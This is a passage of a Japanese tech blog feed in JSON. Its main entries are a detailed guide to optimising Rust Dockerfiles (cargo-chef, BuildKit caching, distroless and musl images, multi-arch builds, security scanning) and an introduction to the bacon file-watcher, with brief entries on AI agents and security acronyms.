〜基礎からMCP・A2Aまで〜","link":"https://speakerdeck.com/shukob/aiezientoru-men-ji-chu-karamcpa2amade","contentSnippet":"https://genai-users.connpass.com/event/373059/\\r2025年10月18日、オープンソースカンファレンス2025 Online/Fallで発表した資料です。\\r\\r今話題となっている「AIエージェント」について、要素技術となる生成AIを用いてどのように自律的に動作するのか基礎を説明した後、AIが外部のツールやデータにアクセスするためのオープンプロトコルであるMCP（Model Context Protocol）や、複数のエージェントによる分業と連携を可能にするオープンプロトコルA2A（Agent-to-Agent）について解説しました。","isoDate":"2025-10-18T04:00:00.000Z","dateMiliSeconds":1760760000000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"英語4文字のセキュリティ用語あれこれ説明できる？ - SBOM/SAST/DAST...","link":"https://zenn.dev/r4ynode/articles/security-english-words","contentSnippet":"セキュリティの話になると、謎の4文字くらいの英語が羅列しているのを見たことありません？それらのセキュリティ用語を説明できますか？私はできません多すぎて分からなくなるので少し整理します。!内容は概要程度です。機能面についても利用するソフトウェアやベンダーに依存するため参考程度に。 早見表用語一言解説SBOMソフトウェア部品表。構成要素を一覧化する。SCAOSSやライブラリの脆弱性・ライセンス管理。ASTアプリの脆弱性を検出するセキュリティテスト。SASTソースコードを静的解析して脆弱性検出。DAST実行中アプリに攻撃して...","isoDate":"2025-10-18T03:00:01.000Z","dateMiliSeconds":1760756401000,"authorName":"Reito Koike","authorId":"reito"},{"title":"RustのDockerfile、2025年はこれでいこう","link":"https://syu-m-5151.hatenablog.com/entry/2025/10/17/070250","contentSnippet":"はじめに「Dockerでビルドすると遅いんだよね」「イメージが2GB超えちゃって…」そんな会話はもう過去の話です。2025年、コンテナ化は劇的に進化しました。Rustも例外ではありません。cargo-chefとBuildKitキャッシュマウントの組み合わせでビルド時間を5-10倍短縮、2.63GBのイメージをdistrolessイメージで約50MB、musl静的リンクならわずか1.7MBという値を達成できます。この記事では、実践的なDockerfileパターンとベンチマーク結果を詳しく解説します。実際に検証したAxum Webアプリケーションでは、distroless版で50.3MB、musl+scratch版で1.71MBを達成しました。中規模プロジェクト（約500の依存関係）での初回ビルドは10分、コード変更後の再ビルドはわずか40秒です。信じられないかもですが、これが2025年の現実です。ちゃんとやれって話です。あと皆さんのDockerfileも教えて欲しいです。このブログが良ければ読者になったり、nwiizoのXやGithubをフォローしてくれると嬉しいです。では、早速はじめていきます。2025年の重要なアップデートRust 2024 Edition（2025年2月20日リリース）Rust 1.85.0でRust 2024 Editionが安定版になりました。Docker環境でRust 1.85以降を使えば、Edition 2024の機能が使えます。doc.rust-lang.orgblog.rust-lang.orgDocker関連の進化Docker Engine v28：コンテナネットワーキングのセキュリティ強化、AMD GPUサポートdocs.docker.comdocker init GA：Rustプロジェクト用の最適化されたDockerfile自動生成docs.docker.comDocker Bake GA：複雑なビルド設定の宣言的管理docs.docker.comBuildKit 0.25.1：Git URLクエリパラメータ、シークレットの環境変数化など新機能github.com基本的な考え方マルチステージビルドは前提条件2025年でマルチステージビルドを使わないのは、正直あり得ません。まずメンテナンス性が格段に向上します。最終的な成果物以外ではサイズを意識したトリッキーな記述が不要になるため、Dockerfileの可読性が劇的に良くなります。次にビルド速度のアップ。並列化、キャッシュマウント、tmpfsなど最適化オプションが豊富に使えるようになり、ビルドパイプライン全体が高速化します。そして何よりセキュリティの向上。シークレット管理の仕組みが標準化され、機密情報の取り扱いが安全になりました。docs.docker.comCOPYは最小限に、--mountを活用COPYが登場するのは、実質的に2つの場面だけです。マルチステージビルドで別ステージから成果物を持ってくる場合と、最終ステージでアプリケーションバイナリをコピーする場合。それ以外、特にソースコードのビルド時には--mount=type=bindを使用します。docs.docker.com必ず記述すべきおまじない# syntax=docker/dockerfile:1この1行を必ず先頭に記述します。最新のDockerfile構文が自動的に利用され、新機能が使えるようになります。docs.docker.com2025年のDockerfileはこれでやります前置きはこれくらいにして、実際のコードを見ていきましょう。これが2025年のRust標準Dockerfileです。cargo-chefによる依存関係の分離、BuildKitキャッシュマウント、distrolessイメージ、非rootユーザー実行。この記事で解説してきたベストプラクティスのすべてが、この1つのテンプレートに詰め込まれています。# syntax=docker/dockerfile:1ARG RUST_VERSION=1.85ARG APP_NAME=myapp# cargo-chefを使った依存関係キャッシングFROM lukemathwalker/cargo-chef:latest-rust-${RUST_VERSION} AS chefWORKDIR /appFROM chef AS plannerCOPY . .RUN cargo chef prepare --recipe-path recipe.jsonFROM chef AS builder# 依存関係のビルド（キャッシュ可能）COPY --from=planner /app/recipe.json recipe.jsonRUN --mount=type=cache,target=/usr/local/cargo/registry,sharing=locked \\\\    --mount=type=cache,target=/usr/local/cargo/git,sharing=locked \\\\    cargo chef cook --release --recipe-path recipe.json# アプリケーションのビルドCOPY . .RUN --mount=type=cache,target=/usr/local/cargo/registry,sharing=locked \\\\    --mount=type=cache,target=/usr/local/cargo/git,sharing=locked \\\\    --mount=type=cache,target=/app/target,sharing=locked \\\\    cargo build --release --bin ${APP_NAME} && \\\\    cp ./target/release/${APP_NAME} /bin/server# テストステージ（オプション）FROM chef AS testCOPY . .RUN --mount=type=cache,target=/usr/local/cargo/registry \\\\    --mount=type=cache,target=/usr/local/cargo/git \\\\    cargo test# 本番ステージ：distrolessFROM gcr.io/distroless/cc-debian12:nonroot AS runtimeCOPY --from=builder /bin/server /app/WORKDIR /appEXPOSE 8000ENTRYPOINT [\\"/app/server\\"]このDockerfileの主な特徴cargo-chefによる依存関係の分離とキャッシングBuildKitキャッシュマウントでレイヤーを跨いだキャッシュdistrolessによる最小サイズと高セキュリティ非rootユーザー（:nonrootタグ）での実行オプショナルなテストステージビルド最適化の3つの柱1. cargo-chefcargo-chefは、Rustの依存関係管理をDockerレイヤーキャッシュに適合させる画期的なツールです。依存関係のコンパイルとソースコードのコンパイルを完全に分離します。動作メカニズム（2段階）：cargo chef prepare：Cargo.tomlとCargo.lockを解析してrecipe.jsonを作成cargo chef cook：最小限のプロジェクト構造を再構築して依存関係のみをビルド重要：同じRustバージョンと作業ディレクトリを全ステージで使用すること。異なるバージョンを使うとキャッシュが無効化されます。実測データ：cargo-chefのみで55%の改善cargo-chef + sccacheで79%の改善（34秒→7秒）商用プロジェクト（14,000行、500依存関係）で10分→2分github.com2. BuildKitキャッシュマウントBuildKitのキャッシュマウント（Docker 18.09以降）を使うと、レイヤー無効化を超えて永続化するキャッシュボリュームが利用できます。3つの重要なキャッシュポイント：RUN --mount=type=cache,target=/usr/local/cargo/registry,sharing=locked \\\\    --mount=type=cache,target=/usr/local/cargo/git,sharing=locked \\\\    --mount=type=cache,target=/app/target,sharing=locked \\\\    cargo build --release/usr/local/cargo/registry：crates.ioからのダウンロード/usr/local/cargo/git：Git依存関係/app/target：ビルド成果物sharing=lockedパラメータは排他アクセスを保証し、パッケージマネージャーの破損を防ぎます。CI環境でのキャッシュ共有：# GitHub Actions- uses: docker/build-push-action@v6  with:    cache-from: type=gha    cache-to: type=gha,mode=maxパフォーマンスベンチマーク：ベースライン：90.60秒BuildKitキャッシュマウント：15.63秒（5.8倍高速）cargo-chef：18.81秒（4.8倍高速）三位一体（chef + BuildKit + sccache）：7-12秒（7.5-13倍高速）docs.docker.com3. sccachesccache（v0.7.x）はMozilla製のccache風コンパイララッパーで、個々のコンパイル成果物を細粒度でキャッシュします。github.comFROM rust:1.85 AS builder# sccacheのインストールと設定RUN cargo install sccache --version ^0.7ENV RUSTC_WRAPPER=sccache \\\\    SCCACHE_DIR=/sccache \\\\    CARGO_INCREMENTAL=0WORKDIR /appRUN --mount=type=cache,target=/usr/local/cargo/registry \\\\    --mount=type=cache,target=$SCCACHE_DIR,sharing=locked \\\\    --mount=type=bind,target=. \\\\    cargo build --release重要：CARGO_INCREMENTAL=0は必須。インクリメンタルコンパイルとsccacheは競合します。キャッシュヒット率：初回ビルド：0%ソースコード変更のみ：85-95%依存関係を更新した時：60-75%注意点：sccacheの効果は環境によって大きく異なります。一部の環境では効果が薄く、逆にオーバーヘッドとなる場合があります。自環境でのベンチマークが必須です。イメージサイズの最適化：ベースイメージ選択戦略ビルドステージ：rust:slim推奨2025年はrust:slim（Debian系）でよいと思っています。console.cloud.google.comFROM rust:1.85-slim-bookworm AS builder理由はシンプルです。Debian stable（bookworm）ベースでglibcを使用しているため、広範な互換性とマルチスレッドワークロードでの優れたパフォーマンスを発揮します。完全版のrust:latestが624MBもあるのに対し、rust:slimはコンパイルに必要な最小限のパッケージだけを含んでいます。無駄がありません。rust:alpineは避けてください。 muslの互換性問題に加えて、マルチスレッドアプリケーションで最大30倍のパフォーマンス劣化が報告されています。イメージサイズの小ささに惹かれる気持ちはわかりますが、本番環境でこの劣化は致命的です。https://hub.docker.com/_/rust最終ステージ：distroless推奨gcr.io/distroless/cc-debian12が2025年の標準です。FROM gcr.io/distroless/cc-debian12:nonrootdistrolessの特徴：サイズ：21-29MBglibc、SSL証明書、タイムゾーンデータ、/etc/passwdを含むパッケージマネージャー、シェル不要なバイナリを完全排除SLSA 2準拠、cosign署名検証が可能CVEスキャンで従来イメージより50-80%少ない脆弱性:nonrootタグでUID 65534（nobody）として非rootで実行github.comイメージサイズ比較（実測値） イメージ構成  サイズ  用途  特徴  scratch + musl（実測）  1.71MB  CLIツール最小化  完全静的リンク  distroless/static  2-3MB  静的リンクバイナリ  最小限のファイル  distroless/cc-debian12（実測）  50.3MB  Webアプリ推奨  glibc  debian-slim  80-120MB  フル互換性  デバッグツールあり  rust:latest（未最適化）  2.63GB  開発専用  ビルドツール込み 実測削減率：rust:latest（2.63GB）→ distroless（50.3MB）：98.1%削減rust:latest（2.63GB）→ musl+scratch（1.71MB）：99.9%削減静的リンク vs 動的リンクmusl（x86_64-unknown-linux-musl）での静的リンク：FROM rust:1.85-alpine AS builderRUN apk add --no-cache musl-devWORKDIR /app# 依存関係のキャッシュCOPY Cargo.toml Cargo.lock ./RUN --mount=type=cache,target=/usr/local/cargo/registry \\\\    mkdir src && echo \\"fn main() {}\\" > src/main.rs && \\\\    cargo build --release --target x86_64-unknown-linux-musl && \\\\    rm -rf src# アプリケーションのビルドCOPY src ./srcRUN --mount=type=cache,target=/usr/local/cargo/registry \\\\    cargo build --release --target x86_64-unknown-linux-muslFROM scratchCOPY --from=builder /app/target/x86_64-unknown-linux-musl/release/myapp /myappENTRYPOINT [\\"/myapp\\"]利点：依存関係ゼロで完全にポータブルscratchコンテナで実行可能イメージサイズ5-10MB欠点：シングルスレッドで0.9-1.0倍、マルチスレッドで0.03-0.5倍のパフォーマンス一部依存関係でsegfaultのリスク本番環境の推奨：複雑なアプリケーション（Webサーバー、DB接続）：glibc + distroless/cc-debian12シンプルなCLIツール：musl + scratchを検討パフォーマンスが重要：必ずglibcを使用マルチアーキテクチャビルドlinux/amd64とlinux/arm64の両対応が2025年の標準要件です。cargo-zigbuild：セットアップゼロのクロスコンパイルcargo-zigbuild（v0.20.1）はZigツールチェインを使い、セットアップ不要でクロスコンパイルできます。github.com# syntax=docker/dockerfile:1ARG RUST_VERSION=1.85FROM --platform=$BUILDPLATFORM rust:${RUST_VERSION}-alpine AS builderWORKDIR /app# Zigとcargo-zigbuildのインストールRUN apk add --no-cache musl-dev openssl-dev zigRUN cargo install --locked cargo-zigbuild# ターゲットの設定ARG TARGETPLATFORMRUN case ${TARGETPLATFORM} in \\\\    \\"linux/amd64\\") echo x86_64-unknown-linux-musl > /rust_target ;; \\\\    \\"linux/arm64\\") echo aarch64-unknown-linux-musl > /rust_target ;; \\\\    esac && \\\\    rustup target add $(cat /rust_target)# 依存関係とビルドCOPY Cargo.toml Cargo.lock ./RUN --mount=type=cache,target=/usr/local/cargo/registry \\\\    mkdir src && echo \\"fn main() {}\\" > src/main.rs && \\\\    cargo zigbuild --release --target $(cat /rust_target) && \\\\    rm -rf srcCOPY src ./srcRUN --mount=type=cache,target=/usr/local/cargo/registry \\\\    cargo zigbuild --release --target $(cat /rust_target)FROM alpine:latestARG TARGETPLATFORMCOPY --from=builder /app/target/*/release/app /appCMD [\\"/app\\"]重要：--platform=$BUILDPLATFORMを使うと、ビルド自体はネイティブアーキテクチャで実行できるので、QEMUエミュレーションより圧倒的に速いです（QEMUエミュレーションは16-25倍遅い）。実測データ：ネイティブビルド：2-3分QEMUエミュレーション：50分（16-25倍遅い）cargo-zigbuildクロスコンパイル：13分Docker buildxでのマルチプラットフォームビルド# ビルダーの作成docker buildx create --name container-builder \\\\    --driver docker-container --bootstrap --use# マルチプラットフォームビルドdocker buildx build \\\\    --platform linux/amd64,linux/arm64 \\\\    -t myimage:latest \\\\    --push .https://docs.docker.com/build/buildx/docs.docker.comセキュリティベストプラクティス1. 非rootユーザーで実行distroless :nonrootタグが最も簡単：FROM gcr.io/distroless/cc-debian12:nonrootCOPY --from=builder /app/target/release/myapp /usr/local/bin/CMD [\\"/usr/local/bin/myapp\\"]自動的にUID 65534（nobody）として実行されます。カスタムユーザー作成：FROM debian:bookworm-slimARG UID=10001RUN adduser \\\\    --disabled-password \\\\    --gecos \\"\\" \\\\    --home \\"/nonexistent\\" \\\\    --shell \\"/sbin/nologin\\" \\\\    --no-create-home \\\\    --uid \\"${UID}\\" \\\\    appuserUSER appuserCOPY --from=builder /app/target/release/myapp /app/CMD [\\"/app/myapp\\"]2. 脆弱性スキャンTrivy（推奨）：# イメージスキャンdocker run --rm -v /var/run/docker.sock:/var/run/docker.sock \\\\    aquasec/trivy image myapp:latest# CI/CD統合- name: Run Trivy scan  uses: aquasecurity/trivy-action@master  with:    image-ref: \'myapp:${{ github.sha }}\'    severity: \'CRITICAL,HIGH\'    exit-code: \'1\'github.comdistrolessのセキュリティ優位性：Alpine（musl）からChiseled Ubuntu（glibc）への移行で30+ CVEが0 CVEにdistrolessイメージはAlpineより50-80%少ないCVEパッケージマネージャー不在により攻撃ベクトル削減SLSA 2準拠、cosign署名認証3. シークレット管理絶対に避けるべき：環境変数へのシークレット設定イメージに焼き込まれてしまいます。正しい方法：# ビルド時シークレットRUN --mount=type=secret,id=api_token,env=API_TOKEN \\\\    cargo build --release# 実行時docker build --secret id=api_token,env=API_TOKEN .4. イメージバージョンのピン留め# ❌ 避けるべきFROM rust:latest# ✅ 推奨FROM rust:1.85-slim-bookwormユースケース別DockerfileWebアプリケーション（Axum / Actix-web）上記の「標準Dockerfile」パターンをそのまま使用できます。CLIツール（完全静的リンク）# syntax=docker/dockerfile:1FROM rust:1.85-alpine AS builderWORKDIR /appRUN apk add --no-cache musl-dev openssl-dev openssl-libs-static# 依存関係のキャッシュCOPY Cargo.toml Cargo.lock ./RUN --mount=type=cache,target=/usr/local/cargo/registry \\\\    mkdir src && echo \\"fn main() {}\\" > src/main.rs && \\\\    cargo build --release --target x86_64-unknown-linux-musl && \\\\    rm -rf srcCOPY src ./srcRUN --mount=type=cache,target=/usr/local/cargo/registry \\\\    cargo build --release --target x86_64-unknown-linux-muslFROM scratchCOPY --from=builder /app/target/x86_64-unknown-linux-musl/release/cli-tool /app/ENTRYPOINT [\\"/app/cli-tool\\"]シェルエイリアスは以下のように設定できます。alias my-cli=\'docker run --rm -v $(pwd):/data my-cli-image\'ワークスペース（モノレポ）対応# syntax=docker/dockerfile:1ARG SERVICE_NAME=api-gatewayARG RUST_VERSION=1.85FROM lukemathwalker/cargo-chef:latest-rust-${RUST_VERSION} AS chefWORKDIR /appFROM chef AS plannerCOPY . .RUN cargo chef prepare --recipe-path recipe.jsonFROM chef AS builderARG SERVICE_NAMECOPY --from=planner /app/recipe.json recipe.jsonRUN --mount=type=cache,target=/usr/local/cargo/registry,sharing=locked \\\\    --mount=type=cache,target=/usr/local/cargo/git,sharing=locked \\\\    cargo chef cook --release --bin ${SERVICE_NAME} --recipe-path recipe.jsonCOPY . .RUN --mount=type=cache,target=/usr/local/cargo/registry,sharing=locked \\\\    --mount=type=cache,target=/app/target,sharing=locked \\\\    cargo build --release --bin ${SERVICE_NAME} && \\\\    cp ./target/release/${SERVICE_NAME} /bin/serviceFROM gcr.io/distroless/cc-debian12:nonrootCOPY --from=builder /bin/service /app/ENTRYPOINT [\\"/app/service\\"]異なるサービスを同じDockerfileから生成できます。docker build --build-arg SERVICE_NAME=api-gateway -t gateway .docker build --build-arg SERVICE_NAME=user-service -t users .実践的な検証結果実際のAxum Webアプリケーション（依存関係82個）で3つの戦略を検証しました。検証環境：CPU: Apple M-series (ARM64)Docker: Colima on macOSRust: 1.85 (Edition 2024)3つのパターン比較パターン1: Naive（最適化なし）- デフォルトの実態Dockerfile.naive は何も工夫しないシンプルなビルドです。これが「デフォルトの何もしていない状態」です。⚠️ デフォルト状態のビルド結果初回ビルド時間: 約10-15分（依存関係82個を全てコンパイル）ソースコード変更後の再ビルド: 約10-15分（依存関係も毎回再コンパイル）最終イメージサイズ: 2.63GBセキュリティ: rootユーザー、開発ツール込み（脆弱性大）問題点：ソースコード1行変更するだけで10-15分のビルドが毎回走るイメージに不要なRustコンパイラ（500MB）、ビルドツール、ドキュメントが全て含まれるマルチステージビルドがないため、最終イメージが巨大cargo-chefがないため、依存関係とソースコードが分離されていないパターン2: Baseline（cargo-chef + distroless）Dockerfile は2025年の推奨パターンです。ビルド結果ビルド時間: 38秒（依存関係キャッシュ済み）最終イメージサイズ: 50.3MBセキュリティ: 非rootユーザー（UID 65534）、最小限のファイルTrivy脆弱性: 0 HIGH/CRITICALパターン3: Ultra-minimal（musl + scratch）Dockerfile.musl は最小サイズを優先したパターンです。ビルド結果ビルド時間: 46秒（依存関係キャッシュ済み）最終イメージサイズ: 1.71MBセキュリティ: rootユーザー（scratchに制限あり）比較結果まとめ 項目  Naive (未最適化)  Baseline (distroless)  Ultra-minimal (musl)  イメージサイズ  2.63GB  50.3MB  1.71MB  削減率  - (100%)  98.1%削減  99.9%削減  ビルド時間  30秒  38秒  46秒  マルチステージ  ❌ なし  ✅ あり (4段階)  ✅ あり (2段階)  キャッシュ最適化  ❌ なし  ✅ cargo-chef + BuildKit  ✅ BuildKit  ベースイメージ  rust:1.85 (full)  distroless/cc-debian12  scratch  リンク方式  動的（glibc）  動的（glibc）  静的（musl）  開発ツール  ❌ 含まれる  ✅ 除去済み  ✅ 除去済み  セキュリティ  ❌ 低  ✅ 高  ⚠️ 中  デバッグ  ✅ 可能  ❌ 困難  ❌ 不可能 パフォーマンスベンチマーク商用プロジェクト（14,000行、500依存関係）：最適化なし：10分cargo-chef使用：2分（5倍高速化）大規模ワークスペース（400 crate、1500依存関係）：未最適化：約65分最適化後：約2分（30倍以上の改善）検証の再現方法このリポジトリで実際に試せます。# Baseline版のビルドdocker build -t rust-demo:baseline .# Ultra-minimal版のビルドdocker build -f Dockerfile.musl -t rust-demo:musl .# サイズ比較docker images | grep rust-demo# 動作確認docker run -p 8000:8000 rust-demo:baselinedocker run -p 8001:8000 rust-demo:muslよくある問題と解決策OpenSSLリンクエラーエラー： \\"Could not find directory of OpenSSL installation\\"解決策1：vendored OpenSSL（最も簡単）[dependencies]openssl = { version = \\"0.10\\", features = [\\"vendored\\"] }解決策2：Alpine適切パッケージFROM rust:1.85-alpineRUN apk add --no-cache openssl-dev openssl-libs-static musl-dev解決策3：Debianベース使用FROM rust:1.85-slim-bookwormRUN apt-get update && apt-get install -y pkg-config libssl-dev解決策4：rustls（Rust-native TLS）[dependencies]reqwest = { version = \\"0.11\\", features = [\\"rustls-tls\\"], default-features = false }muslリンクエラーAlpine向け：FROM rust:1.85-alpineRUN apk add musl-dev openssl-dev openssl-libs-staticRUN rustup target add x86_64-unknown-linux-muslENV PKG_CONFIG_ALLOW_CROSS=1RUN cargo build --release --target x86_64-unknown-linux-musl必要な環境変数：RUSTFLAGS=\'-C target-feature=+crt-static\'PKG_CONFIG_ALLOW_CROSS=1OPENSSL_STATIC=1（システムOpenSSL使用時）DNS解決エラー（scratchイメージ）解決策1：distroless/static使用FROM gcr.io/distroless/static-debian12解決策2：Pure Rust DNSリゾルバー[dependencies]reqwest = { version = \\"0.11\\", features = [\\"trust-dns\\"] }解決策3：必要ファイルコピーFROM alpine:latest AS ca-certificatesRUN apk add -U --no-cache ca-certificatesFROM scratchCOPY --from=ca-certificates /etc/ssl/certs/ca-certificates.crt /etc/ssl/certs/.dockerignoreの重要性.dockerignoreがないと、target/ディレクトリ（数GB）がビルドコンテキストに含まれ、ビルドが遅くなります。# .dockerignoretarget/.git/.env*.log効果: ビルドコンテキストのサイズを数GBから数MBに削減 → ビルド開始が高速化。イメージサイズ肥大化一般的原因と解決策：最終イメージにビルドツール含む → マルチステージビルドで93%削減本番環境でfull rustイメージを使用 → slimランタイムベースで95%削減バイナリにデバッグシンボルが含まれる → strip target/release/myappで30-40%削減開発依存関係 → プロファイル設定[profile.release]strip = truelto = truecodegen-units = 12025年の新ツール活用docker init - プロジェクトの素早い立ち上げ# プロジェクトディレクトリで実行docker init# Rustを選択すると自動生成：# - Dockerfile# - compose.yaml# - .dockerignore# - README.Docker.mddocs.docker.comDocker Bake - 複雑なビルドの管理docker-bake.hcl:group \\"default\\" {  targets = [\\"app\\"]}variable \\"TAG\\" {  default = \\"latest\\"}target \\"app\\" {  context = \\".\\"  dockerfile = \\"Dockerfile\\"  tags = [\\"myapp:${TAG}\\"]  platforms = [\\"linux/amd64\\", \\"linux/arm64\\"]  cache-from = [\\"type=registry,ref=myapp:cache\\"]  cache-to = [\\"type=registry,ref=myapp:cache,mode=max\\"]}# 実行docker buildx bake# 変数をオーバーライドdocker buildx bake --set TAG=v1.0.0docs.docker.comおわりにこの記事では、2025年時点でのRust Dockerのベストプラクティスを包括的に解説しました。cargo-chefによる依存関係の分離キャッシング、BuildKitの永続キャッシュマウント、distrolessイメージによるセキュリティ強化という3つの柱を中心に、実践的なDockerfileパターンと実測データを提供しています。Rustのコンテナ化は長い間「ビルドが遅い」「イメージが大きい」という課題を抱えていました。コンパイル時間の長さは諦めるしかなく、数GBのイメージサイズは「Rustだから仕方ない」と言われてきました。しかし、2025年現在、その課題は完全に解決しました。適切な最適化で、ビルド時間を5-10倍短縮、イメージサイズを98-99%削減できます。これは単なる理論ではなく、実際のプロダクション環境で日々使われている技術です。2025年のゴールデンルールこの記事で紹介した技術を実践する際は、以下の10のポイントを押さえておくといいでしょう。# syntax=docker/dockerfile:1を必ず記述 - 最新のDockerfile構文を自動利用cargo-chefで依存関係を分離 - 5-10倍のビルド高速化を実現BuildKitキャッシュマウントを活用 - レイヤーを超える永続的なキャッシュdistroless/cc-debian12:nonrootを使用 - 50MB、非root、高セキュリティrust:slim-bookwormでビルド - Alpineは避ける（マルチスレッド性能問題）RUN --mount=type=bindでソースコードをマウント - COPYの最小化マルチステージビルドは必須 - 2025年の前提条件非rootユーザーで実行 - セキュリティの基本原則TrivyまたはGrypeでスキャン - 継続的なセキュリティ検証イメージバージョンをピン留め - :latestは避ける大半の本番ワークロードには、glibc + distroless/cc-debian12 + cargo-chefの組み合わせが最適解です。この構成により、50MBの小サイズ、2分の高速ビルド、フルパフォーマンス、優れたセキュリティプロファイルを実現できます。マルチスレッドアプリケーションでmuslを使う場合、1点だけ注意が必要です。最大30倍のパフォーマンス劣化リスクがあるので、本番環境への導入前に必ずベンチマークで検証しましょう。イメージサイズだけで判断すると、後で後悔します。2025年のRust Dockerは、従来の課題を完全に克服しました。高速、小サイズ、セキュア、マルチアーキテクチャ対応の成熟した技術スタックになっています。この記事で紹介した標準Dockerfileパターンは、そのままプロダクション環境で使える構成です。まずは標準パターンから始めて、必要なら sccache や cargo-zigbuild などの高度な最適化を追加するといいでしょう。Rustエコシステムの進化とDockerの機能強化で、今後もさらに改善していくはずです。この記事が、あなたのRustアプリケーションのコンテナ化に役立てば嬉しいです。","isoDate":"2025-10-16T22:02:50.000Z","dateMiliSeconds":1760652170000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"baconを知らずにRust書いてた","link":"https://syu-m-5151.hatenablog.com/entry/2025/10/16/170800","contentSnippet":"cargo-watch、やめるってよRustを書いてると、気づくんですよね。保存ボタンを押すたび、手動でcargo checkとかcargo testとか叩いてる自分に。「あれ、俺って原始人だっけ？」みたいな気持ちになる。そこで救世主として現れたのがcargo-watchだったわけです。過去形。github.comそう、cargo-watchはもうメンテされてないんです。引退しちゃった。ここで一旦、真面目な話を。10年以上もcargo-watchとwatchexecっていうOSSプロジェクトを守り続けてきたF\xe9lix Saparelliさんに、心から敬意と感謝を。あなたのおかげで、世界中の無数のRust開発者が「あ、これ便利じゃん」って生産性爆上げできたんです。本当にありがとうございました。で、公式READMEには作者本人がこう書き残してる。\\"It\'s time to let it go. Use Bacon. Remember Cargo Watch.\\"なんかもう、エモすぎません？10年以上続いたプロジェクトが、バトンを次世代に渡して静かに去っていく感じ。その後継者がbacon。そして汎用性の塊みたいなwatchexec。ベーコンって名前、朝ごはん感あるけど、これが本当にすごいんですよ。というわけでこの記事では、Rust開発で使えるファイル監視ツールについて解説していきます。cargo-watchロス、今日で終わりにしましょう。baconって何？baconは、Rust専用に作られたバックグラウンドコードチェッカーです。エディタの隣で動かしておくと、ファイルを保存するたびに自動でコンパイルチェックを走らせて、エラーや警告をリアルタイムで表示してくれます。github.comcargo-watchとの違いcargo-watchの作者が「baconこそが自分の理想だった」と語っているほど、baconは進化しています。TUIで見やすい - エラーが警告より先に表示され、スクロール不要キーボード操作 - tでテスト、cでClippy、dでドキュメントと一瞬で切り替え小さい画面でも快適 - ターミナルのサイズに合わせて表示を最適化Rust Analyzerと競合しない - 開発体験がスムーズインストール# 基本インストールcargo install --locked bacon# オプション機能も入れる（クリップボード、サウンド）cargo install --locked bacon --features \\"clipboard sound\\"基本的な使い方プロジェクトのルートでbaconを起動するだけ。cd your-rust-projectbaconデフォルトではcargo checkが走ります。ファイルを保存すると自動で再チェック。主要なキーボードショートカットbaconの真価はキーボードショートカットにあります。t - テスト実行に切り替えc - Clippyに切り替えd - ドキュメントをブラウザで開くf - テスト失敗時、そのテストだけに絞り込みEsc - 前のジョブに戻るCtrl+j - すべてのジョブ一覧を表示h - ヘルプ表示q - 終了特定のジョブで起動# テストを監視bacon test# Clippyを監視bacon clippy# 厳格なClippyルール（pedantic）bacon pedantic# 高速テストランナー（nextest）bacon nextest# すべてのターゲットをチェックbacon check-all# 特定のジョブを指定bacon --job my-custom-jobbacon.toml で設定をカスタマイズプロジェクトに合わせてジョブを定義できます。# 設定ファイルを生成bacon --init設定例# bacon.toml# Windows向けのチェック[jobs.check-win]command = [\\"cargo\\", \\"check\\", \\"--target\\", \\"x86_64-pc-windows-gnu\\"]# 厳しめのClippy[jobs.clippy-strict]command = [    \\"cargo\\", \\"clippy\\", \\"--\\",    \\"-D\\", \\"warnings\\",    \\"-A\\", \\"clippy::collapsible_if\\",]need_stdout = false# サンプルをチェック[jobs.check-examples]command = [\\"cargo\\", \\"check\\", \\"--examples\\", \\"--color\\", \\"always\\"]watch = [\\"examples\\"]  # srcは自動で監視される# 実行ジョブ[jobs.run]command = [\\"cargo\\", \\"run\\"]allow_warnings = trueneed_stdout = true# キーバインディングのカスタマイズ[keybindings]shift-c = \\"job:clippy-strict\\"r = \\"job:run\\"設定しておいてよいことドキュメントを素早く確認[jobs.doc-open]command = [\\"cargo\\", \\"doc\\", \\"--no-deps\\", \\"--open\\"]need_stdout = falseon_success = \\"back\\"  # ドキュメントが開いたら前のジョブに戻る長時間実行するアプリケーション[jobs.server]command = [\\"cargo\\", \\"run\\"]allow_warnings = trueneed_stdout = truebackground = falseon_change_strategy = \\"kill_then_restart\\"watchexecとの使い分けbaconはRust専用ですが、watchexecは汎用的なファイル監視ツールです。github.comwatchexecを使うべき場合# インストールcargo install watchexec-cli# 基本的な使い方watchexec --restart cargo run# 特定の拡張子だけ監視watchexec -e rs,toml cargo test# デバウンス設定watchexec -d 2000 cargo checkwatchexecが向いているケース：- Rust以外の言語やツール- シェルスクリプトの実行- rsyncなどの同期処理- より細かい制御が必要な場合# 例：TypeScriptのビルドwatchexec -e ts,tsx npm run build# 例：ファイル同期watchexec -w src -- rsync -avhP ./src/ ./backup/実践的なワークフロー開発時のセットアップターミナルを分割左：Vim/Neovim右上：bacon右下：通常のシェル私はWarpを使ってペイン分割している。baconの起動bacon  # デフォルトでcheckが走るコードを書く保存すると自動でチェックエラーがあれば即座に表示エラーが消えたらClippyの警告が見えるテストを書くtキーでテストモードに切り替え失敗したらfで絞り込み修正したらEscで全テストに戻る最終チェックcキーでClippyの提案を確認コード品質を向上ちょっとしたTipsシェルエイリアスで効率化頻繁に使うコマンドをエイリアス化すると便利です。# ~/.zshrc または ~/.bashrc に追加alias bac=\'bacon\'alias bacc=\'bacon clippy\'alias bact=\'bacon test\'alias bacp=\'bacon pedantic\'watchexecで複数パスを監視# srcとtestsディレクトリの.rsと.tomlファイルを監視watchexec -e rs,toml -w src -w tests -- cargo testVim/Neovimとの連携nvim-bacon プラグインbaconの診断結果をNeovimに統合するプラグインがあります。github.com\\" lazy.nvim の場合{  \'Canop/nvim-bacon\',  config = function()    require(\'bacon\').setup()  end}主な機能は以下の通り。エラー箇所へのジャンプQuickfixへの統合:Bacon コマンドでbaconを起動:BaconLoad で診断結果を読み込み補足：VS Code向けVS Codeユーザーの場合は、bacon-lsというLanguage Serverが利用可能です。まとめcargo-watchの時代は終わりました。でも、より良いツールが生まれています。こう使い分けよう：Rust開発 → bacon一択TUIが快適キーボードだけで完結設定ファイルで柔軟にカスタマイズそれ以外 → watchexec汎用的に使えるシンプルで強力シェルスクリプトとの相性抜群baconを知らずにRustを書いていた人は、今すぐ試してください。開発体験が一段階レベルアップします。cargo install --locked baconcd your-projectbaconたったこれだけ。あとはコードを書くだけです。参考リンク：- bacon公式サイト- watchexec GitHub- 